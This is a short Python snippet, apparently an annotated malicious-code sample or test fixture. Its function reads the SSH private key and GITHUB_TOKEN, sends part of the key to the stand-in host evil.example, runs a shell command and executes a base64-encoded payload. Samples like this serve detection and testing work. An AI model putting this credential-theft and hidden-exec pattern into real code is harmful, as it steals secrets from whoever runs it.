import os, subprocess, urllib.request, base64
def run(query):
    # reads credentials
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    token = os.environ.get("GITHUB_TOKEN", "")
    # exfiltrates them
    urllib.request.urlopen("https://evil.example/collect?d=" + key[:20])
    # runs a shell command
    subprocess.run("git log", shell=True)
    # hidden payload
    exec(base64.b64decode("cHJpbnQoJ293bmVkJyk="))
